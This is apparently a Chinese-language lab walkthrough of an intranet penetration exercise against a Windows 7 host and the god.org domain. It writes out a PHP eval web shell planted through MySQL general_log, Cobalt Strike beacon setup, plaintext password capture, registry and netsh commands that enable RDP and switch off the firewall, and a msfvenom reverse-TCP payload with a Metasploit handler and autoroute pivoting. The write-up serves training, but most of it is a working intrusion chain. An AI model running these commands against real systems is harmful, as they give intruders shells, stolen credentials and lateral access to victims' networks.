这里跳过配置。
win7 ip：172.16.170.43
kali ip：172.16.170.38

## 一、访问目标服务器
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678849612762-7786f8dd-895e-49f1-9d2c-52254cbe1626.png#averageHue=%23ccba9c&clientId=u531c24f4-2300-4&from=paste&height=220&id=uccb9d875&name=image.png&originHeight=275&originWidth=1127&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=97011&status=done&style=none&taskId=ufd4fd253-b6fc-4cd1-b036-a85fe956b8e&title=&width=901.6)
访问目标网页是一个php study探针
> 一个很有用的信息网页。可以在这里看到目标服务器的域名和IP地址，网站根目录的绝对路径和探针路径
> ~~php探针是我们下载它的登陆器，进行本地连接，看登陆器端口和其服务器的ip地址，直接在网站去访问它的服务器ip地址，得到的页面~~


![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678849669976-37f61b02-c62b-414a-a0c0-3ed815837413.png#averageHue=%23ccba9d&clientId=u531c24f4-2300-4&from=paste&height=134&id=uae3bc169&name=image.png&originHeight=168&originWidth=839&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42255&status=done&style=none&taskId=u2de9b9e1-2ac5-40f7-bb81-33c27976894&title=&width=671.2)
在这里我们看到有一个mysql数据库的检测，默认用户和密码为root

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678849803540-07a4960a-71ed-4307-82d7-37ad0e626cff.png#averageHue=%23282c38&clientId=u531c24f4-2300-4&from=paste&height=465&id=u7cecd3f2&name=image.png&originHeight=581&originWidth=696&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=150210&status=done&style=none&taskId=u2565cc3d-68cc-42e0-ad28-89082a506b9&title=&width=556.8)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678849877002-f1359793-1892-46fd-a580-eb69ccd779c8.png#averageHue=%23f7f6f5&clientId=u531c24f4-2300-4&from=paste&height=282&id=u91b97894&name=image.png&originHeight=352&originWidth=408&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25010&status=done&style=none&taskId=ufe6dbaf5-bf83-4aac-b0e7-a2c1a3a42d3&title=&width=326.4)
~~由于存在php探针，所以大概率会存在phpmyadmin的登录页面~~
这里通过扫描，发现了phpmyadmin登录页面
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678849896306-5f661427-4509-4b16-bc7d-100b1265ee25.png#averageHue=%23e6e5e4&clientId=u531c24f4-2300-4&from=paste&height=306&id=ub4409976&name=image.png&originHeight=382&originWidth=1045&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=113902&status=done&style=none&taskId=uca8253cd-3129-4bcb-a99e-4a31b1e0e0c&title=&width=836)
通常用户和密码默认都是root，这里直接通过root进入界面，里面可以写sql语言

## 二、sql注入shell
这里因为我们通过之前的php探针知道了网页的绝对路径，可以尝试在phpmyadmin网页下，通过sql语句的 into outfile或者into dumpfile将shell写入路径文件下。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678850128078-f16085b9-0562-4b2e-a112-3a8cff4dd2d2.png#averageHue=%23d4c9a9&clientId=u531c24f4-2300-4&from=paste&height=134&id=u48816e86&name=image.png&originHeight=168&originWidth=998&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48723&status=done&style=none&taskId=ucf26442f-6a39-4d21-9f46-64c3b98a42d&title=&width=798.4)
```sql
select '<?php @eval($POST_['shell']); ?>' into outfile 'C:/php/WWW/shell.php'
```
这里写入shell发现报错！
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678850155493-813e7f8d-bd96-46f7-9f23-1dc79671d577.png#averageHue=%23f7f9ee&clientId=u531c24f4-2300-4&from=paste&height=210&id=ub89da9e8&name=image.png&originHeight=263&originWidth=950&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=39970&status=done&style=none&taskId=u505e9d99-c957-4ed1-b853-2925b68b125&title=&width=760)
```sql
show variables like '%secure_%'
```
这里通过查看secure-file-priv发现为null，说明mysql禁止导入导出操作

这样的话，我们只能试着去试试mysql的日志文件是否能够使用
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678850310209-f18c6cc9-46b0-43a9-9d02-025e2435fbfd.png#averageHue=%23e6f2a2&clientId=u531c24f4-2300-4&from=paste&height=193&id=u6d9c7753&name=image.png&originHeight=241&originWidth=1012&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=55229&status=done&style=none&taskId=u1c03bfd5-8ae6-4948-ae26-f6e144f25c3&title=&width=809.6)
```sql
show global variables like '%general_%'
```
通过查询，发现全局日志文件是关闭的，且也知道了绝对路径。


![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678179270934-c362caa8-45de-4c0b-859a-65622280eccd.png#averageHue=%23eeedec&clientId=u27e7fc2b-7558-4&from=paste&height=61&id=uff4cafa5&name=image.png&originHeight=76&originWidth=560&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11782&status=done&style=none&taskId=uacdf3dc4-bec3-440e-bb66-e41c1a0342c&title=&width=448)
```sql
set global general_log = on
set global general_log_file = 'C:/phpStudy/WWW/shell.php'
```
> 更改日志保存路径！注意不要出现文件名错误！

于是通过语句更新两者，将其日志启动，并更改路径到服务器根目录下。


```sql
select "<?php @eval($_POST['shell']);?>"
```
然后只需要运行查询语句，即可将shell写入日志文件里面，也就是shell.php里面。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678850501170-6c4fd3bc-125f-41cd-8173-70daa2ec0d89.png#averageHue=%23ececec&clientId=u531c24f4-2300-4&from=paste&height=208&id=u928a4c43&name=image.png&originHeight=260&originWidth=912&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35601&status=done&style=none&taskId=u903c6d3d-275e-4754-b85b-3b721eca67e&title=&width=729.6)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678849431767-586c1922-748d-4730-89fc-b4d99c058ba1.png#averageHue=%23e8e7e7&clientId=u531c24f4-2300-4&from=paste&height=159&id=uefb1a3a9&name=image.png&originHeight=199&originWidth=901&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31666&status=done&style=none&taskId=ub9631dd4-2e96-4486-8227-d5a2cf2dabf&title=&width=720.8)
写入shell后，通过蚁剑成功访问服务器文件！

:::info
这里得到一个shell就够了。原本可以在yscms里面再创建一个shell的，这里不多阐述
:::


## 三、连接Cobalt Strike
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678850896462-811c2b88-26b5-4d72-9971-e94502ef31af.png#averageHue=%23212121&clientId=u531c24f4-2300-4&from=paste&height=32&id=u97c73260&name=image.png&originHeight=40&originWidth=217&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=5825&status=done&style=none&taskId=ub1db8563-220d-440c-8de6-1a09ac4faa9&title=&width=173.6)
这里通过蚁剑查看自己的权限，administrator是一个挺高的权限了。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678850996226-5df88bd2-6450-4775-a613-82db55f56dd1.png#averageHue=%23282e3c&clientId=u531c24f4-2300-4&from=paste&height=363&id=u4fb90d8b&name=image.png&originHeight=454&originWidth=746&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25122&status=done&style=none&taskId=u86d90786-a5ed-4e2e-8901-41dcc31c0b9&title=&width=596.8)
于是这里打开我们的cs。我是将cs的服务端和客户端都放在自己电脑上的。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678851044192-a6e98452-287a-41fb-88b3-f729e451f51b.png#averageHue=%23272e3a&clientId=u531c24f4-2300-4&from=paste&height=205&id=uf014ea15&name=image.png&originHeight=256&originWidth=655&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54507&status=done&style=none&taskId=ua2647957-9eaa-403f-b5b5-7d2b3fa83a6&title=&width=524)
我们在cs目录下运行teamserver 输入本机端口 和任意密码，即可开启一个cs服务端，当启动成功后，这个命令端将持续运行，这里不能关闭命令端口。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678851154443-10574f89-451f-49f4-9b94-c98f1b89617e.png#averageHue=%23262d3b&clientId=u531c24f4-2300-4&from=paste&height=309&id=ud070bf1f&name=image.png&originHeight=386&originWidth=656&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=83647&status=done&style=none&taskId=u9fa1b18b-256c-4276-aedb-2752a4beef0&title=&width=525)
这里再打开一个命令端，继续在cs目录下运行 cobaltstrike

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678851255494-0eaa69c2-3019-46c5-a38c-a9ef6fe72d10.png#averageHue=%23bad1bd&clientId=u531c24f4-2300-4&from=paste&height=263&id=u3ada80a7&name=image.png&originHeight=329&originWidth=503&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36326&status=done&style=none&taskId=u1d66840d-8c26-4ccc-8ecb-bd78fdfe6e0&title=&width=402.4)
就会得到一个窗口，然后客户端的命令窗口也不能关闭！
这里主机写服务端的ip，这里我主机和服务端都在kali上，所以我写入本机ip
端口不变，用户随意。
密码写入之前创建服务端的密码，这里是root

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678851367490-32d69307-1089-46bc-9452-1d006bb080f2.png#averageHue=%23457643&clientId=u531c24f4-2300-4&from=paste&height=494&id=ubaeac136&name=image.png&originHeight=618&originWidth=798&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=109951&status=done&style=none&taskId=u33897d22-a84d-49e4-bfb6-7ef6ebb2298&title=&width=638.4)
点击连接后，即可成功进入cs（这里我之前已经攻击过了，所以有东西，如果是刚打开，这里是没有东西的）

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678851443701-c49c54fd-34e4-4dac-bc54-77665d0bac06.png#averageHue=%23c0c8d6&clientId=u531c24f4-2300-4&from=paste&height=501&id=u9291e539&name=image.png&originHeight=626&originWidth=822&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=112205&status=done&style=none&taskId=ue1b38669-0381-4b9d-abc6-d6b835480f3&title=&width=657.6)
这里我们先点击监听器，然后添加一个监听器。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678851518784-a5c0ecb9-1d6d-4570-9077-d88854317816.png#averageHue=%23b7d5c2&clientId=u531c24f4-2300-4&from=paste&height=412&id=ue52c027b&name=image.png&originHeight=515&originWidth=497&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47875&status=done&style=none&taskId=uf4526d87-e8f8-4db6-bf58-a13955fdfae&title=&width=397.6)
这名字随意，payload选择beacon HTTP
payload选项里面：
HTTP地址填写cs服务端ip！
HTTP地址（Stager）填写被攻击的ip地址，这里我攻击win7的ip地址为172.16.170.43
端口写一个不常用的端口，这里写7878
填完后点击创建。
可以看到下方有一个以创建的监听器。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678851693470-31f956a0-6ccd-4908-92a9-08fb18462d09.png#averageHue=%239fb2c7&clientId=u531c24f4-2300-4&from=paste&height=38&id=ud130831b&name=image.png&originHeight=47&originWidth=794&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8891&status=done&style=none&taskId=uf62fa70c-f857-4484-9b76-6fdfd08e058&title=&width=635.2)


![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678851745982-02a594a1-1c0a-4814-a573-de8e73d726c6.png#averageHue=%23becddd&clientId=u531c24f4-2300-4&from=paste&height=198&id=ucb2a9119&name=image.png&originHeight=247&originWidth=807&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=72936&status=done&style=none&taskId=u92164fe9-70a9-46d8-baaf-c4e2021dd09&title=&width=645.6)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678851822642-84a1db12-3e6c-4282-a1b8-b0cdf189d795.png#averageHue=%239ea6b2&clientId=u531c24f4-2300-4&from=paste&height=313&id=uec8537ab&name=image.png&originHeight=391&originWidth=972&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108591&status=done&style=none&taskId=u59092b36-6996-45cf-9637-caa08c44baa&title=&width=777.6)
然后去攻击里面生成一个windows可执行的exe后门程序。操作如图

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678851900179-d04b6288-37ce-49c0-8a51-262b7ffff1c8.png#averageHue=%23d5d8c2&clientId=u531c24f4-2300-4&from=paste&height=334&id=u0749abf7&name=image.png&originHeight=417&originWidth=636&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41974&status=done&style=none&taskId=ufc686cca-865f-430e-8fc2-d1b6e57a286&title=&width=508.8)
然后将这个生成的exe保存到一个你熟悉的路径中即可。这里我保存名字为123.exe

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678851968851-455d32ca-8871-495d-afd0-95073caffe20.png#averageHue=%23f0f0f0&clientId=u531c24f4-2300-4&from=paste&height=36&id=ud0fa7bbd&name=image.png&originHeight=45&originWidth=654&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6379&status=done&style=none&taskId=ud4cdde99-d96b-4441-a37b-ffe2b6ec2f2&title=&width=523.2)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678851998731-fe3ca466-39af-46de-815f-bc3ebbe967dd.png#averageHue=%231b1b1b&clientId=u531c24f4-2300-4&from=paste&height=26&id=u404b1f83&name=image.png&originHeight=32&originWidth=246&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3443&status=done&style=none&taskId=u2e1a2c0b-8c42-4481-a22a-1b437aedc34&title=&width=196.8)
然后通过蚁剑将其上传到文件中后运行

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678852122740-a2aa88d7-8db5-4303-a89b-adfb9dde60a0.png#averageHue=%233e5a4a&clientId=u531c24f4-2300-4&from=paste&height=50&id=uff5a9762&name=image.png&originHeight=63&originWidth=674&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13248&status=done&style=none&taskId=uf5be6d18-5d78-4ab4-ad31-b3f9e19813f&title=&width=539.2)
即可在cs里看到它已上线。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678852164826-e1eed5bf-4233-4728-83e5-9c00416e6e3c.png#averageHue=%23afe0eb&clientId=u531c24f4-2300-4&from=paste&height=66&id=u10e3c33e&name=image.png&originHeight=83&originWidth=815&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25014&status=done&style=none&taskId=u0478900c-d08b-4f5a-a587-3eb7008a0dc&title=&width=652)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678852181602-b5758c63-39bb-41a9-b59a-51901c90aec6.png#averageHue=%23ae9f6b&clientId=u531c24f4-2300-4&from=paste&height=52&id=uaad8300b&name=image.png&originHeight=65&originWidth=434&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7653&status=done&style=none&taskId=u43836080-618e-48f8-94a2-18441648cf2&title=&width=347.2)
这里打开用户的会话交互，先将sleep设置为0，不然会有显示延迟。

下一步就需要用到脚本了。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678852334777-a93006ef-7f1e-4cbc-bc37-99684c1385d3.png#averageHue=%23293245&clientId=u531c24f4-2300-4&from=paste&height=431&id=uce6f39d3&name=image.png&originHeight=539&originWidth=656&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33359&status=done&style=none&taskId=u00fa92d0-dc78-4841-882e-68ce0135606&title=&width=524.8)
这里我提前准备了一些脚本放在了cs目录下。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678852320881-4f3f695a-1d98-4b70-99e0-f9efdf57f925.png#averageHue=%2387a9c6&clientId=u531c24f4-2300-4&from=paste&height=206&id=u69a2fd7a&name=image.png&originHeight=258&originWidth=191&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33281&status=done&style=none&taskId=ub4116f83-fb6e-4449-8f5a-5d5309212ba&title=&width=152.8)
打开脚本管理器。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678852458060-b7308432-0d96-47e4-9df2-d6a5b62dd016.png#averageHue=%23a8d9da&clientId=u531c24f4-2300-4&from=paste&height=346&id=u2c6ee6fc&name=image.png&originHeight=432&originWidth=1284&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=67635&status=done&style=none&taskId=ubb895083-03b3-46d9-9eba-168d0a36055&title=&width=1027.2)
这里添加脚本。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678852473547-5d74654f-87e2-4c83-a985-4723795d3623.png#averageHue=%23c5d1df&clientId=u531c24f4-2300-4&from=paste&height=90&id=u4c1b1cf6&name=image.png&originHeight=113&originWidth=804&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20800&status=done&style=none&taskId=udb16d8b1-47bd-4c9c-88de-5c2c9fc8d1c&title=&width=643.2)
即可看到脚本已加载。

## 四、信息收集
```shell
 ipconfig /all   # 查看本机ip，所在域
 route print     # 打印路由信息
 net view        # 查看局域网内其他主机名
 arp -a          # 查看arp缓存
 net start       # 查看开启了哪些服务
 net share       # 查看开启了哪些共享
 net share ipc$  # 开启ipc共享
 net share c$    # 开启c盘共享
 net use \\192.168.xx.xx\ipc$ "" /user:""    # 与192.168.xx.xx建立空连接
 net use \\192.168.xx.xx\c$ "密码" /user:"用户名"    # 建立c盘共享
 dir \\192.168.xx.xx\c$\user    # 查看192.168.xx.xx c盘user目录下的文件
 
 net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
 net user                 # 查看本机用户列表
 net user /domain         # 查看域用户
 net localgroup administrators    # 查看本地管理员组（通常会有域用户）
 net view /domain         # 查看有几个域
 net user 用户名 /domain   # 获取指定域用户的信息
 net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
 net group 组名 /domain    # 查看域中某工作组
 net group "domain admins" /domain  # 查看域管理员的名字
 net group "domain computers" /domain  # 查看域中的其他主机名
 net group "doamin controllers" /domain  # 查看域控制器（可能有多台）
```


![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678852519570-9282ea7f-2ff3-4417-b5fb-70b750755f85.png#averageHue=%23d3dce6&clientId=u531c24f4-2300-4&from=paste&height=272&id=u3e8ba317&name=image.png&originHeight=340&originWidth=1012&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=88159&status=done&style=none&taskId=u5f18e8bc-a47a-406c-97a7-6bfabc08b24&title=&width=809.6)
这里使用梼杌脚本的信息收集，进行常用信息收集。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678852556529-ec01b280-1e20-442d-a9cd-4e5972fd6a4e.png#averageHue=%23dcdfe5&clientId=u531c24f4-2300-4&from=paste&height=73&id=u9d209342&name=image.png&originHeight=91&originWidth=335&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14101&status=done&style=none&taskId=ucfae70ab-eff2-4b95-899e-b94b793c64c&title=&width=268)
由于我们首先要知道服务器安装了什么补丁，所以我们这里先查看安装补丁。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678868766593-538e1ef4-6601-4cc0-8436-31ccf18c77e0.png#averageHue=%23150c08&clientId=u531c24f4-2300-4&from=paste&height=169&id=uc816fd80&name=image.png&originHeight=211&originWidth=684&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36617&status=done&style=none&taskId=u830ed059-c12a-4ac2-af18-533d7f10fe6&title=&width=547.2)
这里查看到电脑只安装了四个补丁。就这？直接提权！

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678852658536-02d70f8f-a3d5-4f79-aa00-1ec2ae43a791.png#averageHue=%23879089&clientId=u531c24f4-2300-4&from=paste&height=194&id=u94e58bcc&name=image.png&originHeight=242&originWidth=708&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=79838&status=done&style=none&taskId=uad366c4a-66e9-4ed0-bc16-8c4db50c0fc&title=&width=566.4)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678852684102-3d81756b-d031-443c-8855-80e54ef39d52.png#averageHue=%235d6755&clientId=u531c24f4-2300-4&from=paste&height=382&id=ud8d4b112&name=image.png&originHeight=478&originWidth=1138&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=198407&status=done&style=none&taskId=ub6162c31-b0b6-4905-bfa9-f53cb9864c1&title=&width=910.4)
可以看到成功拿到了system的权限，可以为所欲为了。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678868864024-aee496af-903d-41a9-b941-1704c2c05732.png#averageHue=%23090605&clientId=u531c24f4-2300-4&from=paste&height=402&id=u53405578&name=image.png&originHeight=502&originWidth=721&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=90107&status=done&style=none&taskId=u779214ea-0045-4182-a751-8bd263381ae&title=&width=576.8)
这里查看网卡所有信息，发现了域名god.org和ip地址

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678868510642-1df80425-1f27-4aa2-9a7f-037ea9367a68.png#averageHue=%23060504&clientId=u531c24f4-2300-4&from=paste&height=186&id=ub719c811&name=image.png&originHeight=232&originWidth=689&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30449&status=done&style=none&taskId=u3ce2bb0f-c687-45e2-83e4-ad573edf138&title=&width=551.2)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678867798723-7ff926e7-3dde-4bb6-b3f1-03c3e968dd68.png#averageHue=%23070605&clientId=u531c24f4-2300-4&from=paste&height=241&id=u223f28cb&name=image.png&originHeight=301&originWidth=695&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41771&status=done&style=none&taskId=u9c4a359c-613a-43a4-9455-8ca388c8866&title=&width=556)
```bash
net group "domain Controllers" /domain			#查看域内所有域控制器
net group "domain computers" /domain				#查看域内所有成员计算机列表
net group "domain admins" /domain 					#查看域管理员用户
```
这里通过命令得到了域内的一些基本信息！

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678868657411-a2013a57-a764-4eef-9cbc-c4a5e6cf5ef1.png#averageHue=%23d0c397&clientId=u531c24f4-2300-4&from=paste&height=334&id=u49836c4f&name=image.png&originHeight=418&originWidth=939&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=98363&status=done&style=none&taskId=ub85f60c8-f516-43be-b3a4-1e695531477&title=&width=751.2)
抓取明文密码，直接得到STU1主机下Administrator用户的密码！

```bash
#注册表开启3389端口
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f


关闭防火墙
netsh firewall set opmode disable   					#winsows server 2003 之前
netsh advfirewall set allprofiles state off 	#winsows server 2003 之后

```
这里确定主机开启3389端口，然后关闭防火墙，即可登录了！

## 五、横向移动
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678869702288-f8c6bbf1-9c47-4b5e-bb6a-f05b7d7c867f.png#averageHue=%230f0d0b&clientId=u531c24f4-2300-4&from=paste&height=122&id=ua1f10949&name=image.png&originHeight=153&originWidth=455&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15482&status=done&style=none&taskId=ub9d46202-a101-4823-8b72-1784abd4ca3&title=&width=364)
这里先在cs里面arp -a一下，发现一个网段有两台主机，分别是138和141

## ![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678849310081-de4c4d77-3fda-425e-85c5-74693491e25e.png#averageHue=%23232731&clientId=u531c24f4-2300-4&from=paste&height=191&id=u3d4a3544&name=image.png&originHeight=238&originWidth=907&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46819&status=done&style=none&taskId=ud278d104-9ca4-4005-8f7b-32a26ebbd0a&title=&width=726)
这里的步骤跟cs差不多，使用msfvenom生成一个window能运行使用的监听exe
LHOST填写本机ip，也就是使用msf的主机ip。端口填写一个不经常使用的。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678849390012-799b4a64-e27d-4384-8671-7e7844aa3966.png#averageHue=%23262c3a&clientId=u531c24f4-2300-4&from=paste&height=146&id=ua6fc5bed&name=image.png&originHeight=183&originWidth=690&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48356&status=done&style=none&taskId=u3a0f37d6-981d-43f7-af25-bad60883bce&title=&width=552)
kali进入msfconsole，启动监听。
```bash
#生成window可执行的exe程序
msfvenom -p windows/meterpreter_reverse_tcp LHOST=172.16.170.38 LPORT=8989 -f raw -o run2.exe

#在本机中设置监听
msfconsloe																	#进入框架
use exploit/multi/handler										#使用use进入模块
set payload php/meterpreter/reverse_tcp			#设置攻击载荷
set lhost 172.16.170.38											#设置参数
set lport 8989															#设置参数
run																					#开始！
```

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678849342219-d7931976-47c0-4bbe-8de0-d6da00a7a12b.png#averageHue=%23efefef&clientId=u531c24f4-2300-4&from=paste&height=37&id=u825de5cb&name=image.png&originHeight=46&originWidth=650&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=5489&status=done&style=none&taskId=ue3456260-8869-41e0-8f05-e8c8506e817&title=&width=520)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678849366831-a2490293-0cd7-405b-af00-e623f93e11b0.png#averageHue=%230a0a0a&clientId=u531c24f4-2300-4&from=paste&height=167&id=ubcce9643&name=image.png&originHeight=209&originWidth=675&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41377&status=done&style=none&taskId=udf5b6f43-fede-47bc-b559-d0abadc41f8&title=&width=540)
将生成出来的程序（run2.exe）上传并运行

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678849404194-8559f9bc-28a0-4001-b099-c734f18d9914.png#averageHue=%23252936&clientId=u531c24f4-2300-4&from=paste&height=92&id=ua2ce417f&name=image.png&originHeight=115&originWidth=918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=20006&status=done&style=none&taskId=ua3588be5-4327-4650-9bf6-b29a4a31174&title=&width=734.4)
msf即可收到来自监听程序的回应。

![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678872793617-318d6b7c-fcf7-4250-aeb0-66c23b5febad.png#averageHue=%23252937&clientId=u2d9cfd07-d2a6-4&from=paste&height=228&id=ud3e1b469&name=image.png&originHeight=285&originWidth=913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69766&status=done&style=none&taskId=uafc69192-c418-4750-a627-c22ee350da8&title=&width=730.4)
会话窗口的切换命令
```bash
background					#从当前会话返回msf，并挂起当前会话
sessions -l					#列出所有可用的交互会话
sessions -i <id>		#从msf进入到某id的会话窗口
```


![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678878036819-21cd91b3-ff0d-457c-8382-213ee22c21dd.png#averageHue=%23252934&clientId=u2d9cfd07-d2a6-4&from=paste&height=342&id=u5a79c515&name=image.png&originHeight=428&originWidth=709&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=135574&status=done&style=none&taskId=u34945dd4-2cae-46dc-9998-d1db9a09f0c&title=&width=567.2)
```bash
use post/multi/manage/autoroute			#使用autoroute模块
set session 6												#将使用回话设置成6
run																	#开始
route print													#查看路由状态
```
或者如下
```bash
#在会话窗口里
run post/multi/manage/autoroute			#启用autoroute模块
run autoroute -p										#查看当前会话的路由状态
```
两者是一样的效果，相当于在主机里加了个路由器，将内部网络路由出来，但是到这一步后，只有msf能够进入被路由出来的ip，我们要使用其他工具，将其让整个kali都能进入。


![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678878169651-4fc9ab47-26c9-45ec-a543-4f2b1e4707d2.png#averageHue=%23242731&clientId=u2d9cfd07-d2a6-4&from=paste&height=289&id=ub47f2b98&name=image.png&originHeight=361&originWidth=892&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=103791&status=done&style=none&taskId=u7a53cddc-8560-4f17-a64a-9d3528a18fa&title=&width=713.6)


![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678879111148-0a1fff3d-af1c-4967-93ff-307709e6e1ca.png#averageHue=%23252936&clientId=u2d9cfd07-d2a6-4&from=paste&height=289&id=ue6fa7aa4&name=image.png&originHeight=361&originWidth=885&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=91212&status=done&style=none&taskId=u97593c53-8470-410b-863b-ad6bae2e06b&title=&width=708)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678879063425-6c0125a7-a2ce-4c0e-87e0-5098ad523eed.png#averageHue=%23232632&clientId=u2d9cfd07-d2a6-4&from=paste&height=112&id=u45fe073c&name=image.png&originHeight=140&originWidth=374&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8816&status=done&style=none&taskId=u43fd1aa6-6aa2-4e2e-ae2b-3be8c22380e&title=&width=299.2)
![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678879154352-9b42f052-e8db-435e-be53-0ac71e1c0e4f.png#averageHue=%23272b3b&clientId=u2d9cfd07-d2a6-4&from=paste&height=85&id=ue95d8bdb&name=image.png&originHeight=106&originWidth=551&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24636&status=done&style=none&taskId=u1bacb3a3-7863-43e2-8d6f-f254e009de0&title=&width=440.8)


![image.png](https://cdn.nlark.com/yuque/0/2023/png/35224020/1678880029484-4cc50201-4f2b-4e32-b408-e204b160ebfa.png#averageHue=%23262b37&clientId=u2d9cfd07-d2a6-4&from=paste&height=350&id=u55e841b4&name=image.png&originHeight=437&originWidth=896&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=188155&status=done&style=none&taskId=u31583fe6-6eda-41b9-9235-1c2c4b686a1&title=&width=716.8)
